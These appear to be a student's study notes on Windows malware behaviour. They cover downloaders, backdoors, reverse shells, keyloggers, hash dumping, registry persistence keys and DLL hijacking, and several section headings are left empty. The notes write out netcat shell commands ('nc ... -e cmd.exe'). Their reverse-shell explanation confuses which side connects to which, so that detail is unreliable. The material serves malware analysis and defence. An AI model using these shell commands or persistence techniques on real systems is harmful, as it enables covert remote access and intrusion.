## Downloaders and Launchers {#downloaders-and-launchers}

Downloaders download malware + execute on system.

* commonly use Win API:

```
URLDownloadToFileA
WinExec
```

Launcher \(loader\) any executable that installs malware for immediate or future covert execution.

often contain malware designed to load.

## Backdoors {#backdoors}

provides attacker with remote access

communicate commonly over HTTP port 80 \(best way to blend in to network traffic\)

Common set of functionality:

* manipulate registry keys
* enumerate display windows
* create directories
* search files

### Reverse Shell {#reverse-shell}

connection originating from victim machine, providing access to the victim machineâ€™s shell.

Netcat is a common tool in use as a reverse shell

Listening on incoming connections:

```
nc -l -p 80
```

`-l`-&gt; listen  
`-p`-&gt; port

Attacker connects via:

```
nc [victim-ip] 80 -e cmd.exe
```

`-e`-&gt; execute once connection established

#### Windows Reverse Shells {#windows-reverse-shells}

Two coding implementations using`cmd.exe`:

* basic -
  &gt;
   easier to write, works as well as +threaded
  * Socket is created and connection to remote is created.
  * Socket is tied to std streams \(input, output, err\)
  * Windows suppressed from victim
* multithreaded
  * Socket is created, two pipes, two threads.
  * `CreatePipe`
    ties together read/write ends to a pipe \(stdin, stdout\).
  * `CreateProcess`
    ties the standard streams to pipes instead of directly to sockets.
  * Two threads spawned \(I/O\)

### Remote Administration Tool \(RAT\) {#remote-administration-tool-rat}

remotely manage a computer\(s\)

often used in targeted attacks, moving laterally across network.

## Compression

## Obfuscation

## Persistence

## Privilege Escalation

## Defense Evasion

## Credential Stealers

3 types of malware:

1. Programs wait for a user to log in to steal creds
2. Programs that dump info \(such as pass hashes\)
3. Programs that log keystrokes

### GINA interception {#gina-interception}

Windows XP:`Graphical Identification and Authentication (GINA)`interception is a technique that malware uses to steal creds.

GINA is implemented in a DLL,`msgina.dll`, and is loaded by Winlogon exec during login.

### Hash Dumping {#hash-dumping}

Attackers try to grab hashes in order to crack them offline or use them in pass-the-hash attack, using LM and NTLM hashes to auth, without needing to decrypt or crack the hash.

`pwdump`and`pass-the-hash toolkit`are freely available packages.

### Keystroke Logging {#keystroke-logging}

malware records keystrokes so attacker can observed typed data

#### Kernel-based keyloggers {#kernel-based-keyloggers}

Difficult to detect with user-mode apps.

Usually part of a rootkit and can act as keyboard drivers to capture keystrokes, bypassing user-space programs

#### User-space keyloggers {#user-space-keyloggers}

typically use Win API

usually implemented with either hooking/polling.

Hooking -&gt; uses Win API to notify the malware each time a key is pressed \(typically`SetWindowsHookEx`\)

Polling -. uses Win API to constantly poll the state of the keys, typically via`GetAsyncKeyState`and`GetForegroundWindow`

Keyloggers can be identified in Strings listings that may show up as`[Up][Num Lock][Down][Right][UP][Left][PageDown]`

## Persistence Mechanisms

Malware gains access to system and stays within boundary for long time.

### Windows Registry

Popular place for malware to embed itself to persist after restarts:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

More mechanisms are available, few common ones below

#### APPINIT\_DLLS

Malware authors gain persistence for their DLLs through registry location \`AppInit\_DLL\` 

AppInitDLL are loaded into every process that loads `User32.dll`

AppInitDLLs values are stored in:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
```

#### Winlogon Notify

Malware authors can hook malware to a particular \`Winlogon\` event \(logon, logoff, startup, shutdown, lockscreen\)

Registry entry consists of \`Notify\` value in registry key:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\
```

#### SVCHOST Dlls

Malware is often installed as a windows service.

Installing malware as a svchost.exe DLL lets the malware blend into the process list better than standard service.

Svchost.exe is a generic host process for services that run from DLLs.

Each instance of svchost.exe contains a group of services that makes dev, testing, and service group mgmt easier.

Groups are defined at:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
```

Services are defined at:

```
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\ServiceName
```

### Trojanized System Binaries

Malware pathes bytes of a system binary to force the system to exec malware next time binary is run/loaded.

DLLs are popular target

### DLL Load-Order Hijacking

Malware can be used to replace original system dlls with malicious dlls to execute when a DLL is loaded.

Default Search Order for DLLs \(Windows XP\):

```
1. The directory from which the application loaded
2. The current directory
3. The system directory (the GetSystemDirectory function is used to get the path, such as .../Windows/System32/)
4. The 16-bit system directory (such as .../Windows/System/)
5. The Windows directory (the GetWindowsDirectory function is used to get the path, such as .../Windows/)
6. The directories listed in the PATH environment variable
```
